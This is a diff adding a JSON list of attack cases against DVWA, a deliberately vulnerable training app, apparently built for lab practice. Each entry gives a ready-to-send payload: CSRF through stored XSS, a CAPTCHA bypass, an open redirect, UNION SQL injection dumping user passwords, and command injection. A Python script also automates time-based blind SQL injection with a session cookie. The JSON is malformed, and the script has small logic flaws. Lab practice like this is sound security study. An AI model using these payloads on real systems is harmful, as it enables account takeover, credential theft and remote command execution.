@@ -1,0 +1,82 @@
+[
+  {
+    "id": "A01",
+    "vulnerability": "CSRF",
+    "url": "/vulnerabilities/csrf/",
+    "attack_scenario": "Trình duyệt nạn nhân đang đăng nhập DVWA. Lợi dụng trang web có lỗ hổng stored XSS, kẻ tấn công chèn payload vào trang web bị xss stored – khi nạn nhân mở trang đó, form sẽ tự GET tới endpoint thay đổi mật khẩu, server cấp phát thành công vì không kiểm tra token.",
+    "Xss_url": "/vulnerabilities/xss_s/",
+    "method": "POST",
+    "body" : "txtName=<img src='/vulnerabilities/csrf/?password_new=csrf&password_conf=csrf&Change=Change'>&mtxMessage=1&btnSign=Sign Guestbook"
+    
+  },
+   {
+    "id": "A04",
+    "vulnerability": "Insecure CAPTCHA",
+    "url": "/vulnerabilities/captcha/",
+    "attack_scenario": "Thay đổi password mà không cần xác thực captcha.",
+    "method": "POST",
+    "body": "step=2&password_new=123&password_conf=123&g-recaptcha-response=&Change=Change&passed_captcha=true",
+  },
+  {
+    "id": "A04",
+    "vulnerability": "Open HTTP Redirect",
+    "url": " /vulnerabilities/open_redirect/source/medium.php",
+    "attack_scenario": "Kẻ tấn công có thể lừa nạn nhân truy cập vào một URL độc hại mà không cần xác thực.",
+    "method": "GET",
+    "parameter": "?redirect=//github.com/LamChanKhai",
+  },
+  {
+    "id": "A03",
+    "vulnerability": "SQL Injection (Blind)",
+    "url": "/vulnerabilities/sqli_blind/",
+    "attack_scenario": "Gửi các payload SQL Injection time base để lấy version của database.",
+    "method": "POST",
+    "body": "id=1 union select 1,if(ascii(substring((select @@version),1,1))=49,sleep(4),0)&Submit=Submit",
+    "automated_file": "
+                        import requests
+                        import time
+                        charset_ascii = [i for i in range(45, 58)] + [i for i in range(65, 123)]
+                        print(charset_ascii)
+                        url = 'http://127.0.0.1:4280/vulnerabilities/sqli_blind/'
+                        cookie = {'security': 'medium', 'PHPSESSID': '3685f4f741c10c019c5ab1492845bf8f'}
+                        version = ""
+                        for i in range(45):
+                            print('Finding character at position: ' + str(i))
+                            for c in charset_ascii:
+                                print('Testing character: ' + str(c))
+                                injection = '1 union select 1,if(ascii(substring((select @@version),'+str(i)+',1))='+str(c)+',sleep(5),0)'
+                                body = 'id=' + injection + '&Submit=Submit'
+                                print(body)
+                                start_time = time.time()
+                                res = requests.post(url, data=body, cookies=cookie, headers={'Content-Type': 'application/x-www-form-urlencoded'})
+                                end = time.time()
+                                if end - start_time >= 1:
+                                    print('Found character: ' + chr(c))
+                                    version += chr(c)
+                                    break
+                            print('Current version: ' + version)"
+    },
+    {
+    "id": "A04",
+    "vulnerability": "Authorisation Bypass",
+    "url": " /vulnerabilities/authbypass/get_user_data.php",
+    "attack_scenario": "Kẻ tấn công truy cập trực tiếp vào trang api mà không cần quyền",
+    "method": "GET",
+    },
+    {
+    "id": "A03",
+    "vulnerability": "Command Injection",
+    "url": " /vulnerabilities/exec/",
+    "attack_scenario": "Kẻ tấn công chèn mã hệ thống để RCE",
+    "method": "POST",
+    "body": "ip=||echo `whoami`_`hostname`&Submit=Submit",
+    },
+    {
+    "id": "A03",
+    "vulnerability": "SQL Injection",
+    "url": "/vulnerabilities/sqli/",
+    "attack_scenario": "Kẻ tấn công chèn mã truy vấn SQL để lấy danh sách user và password",
+    "method": "POST",
+    "body": "id=1 union select user,password from users&Submit=Submit",
+    },
+]
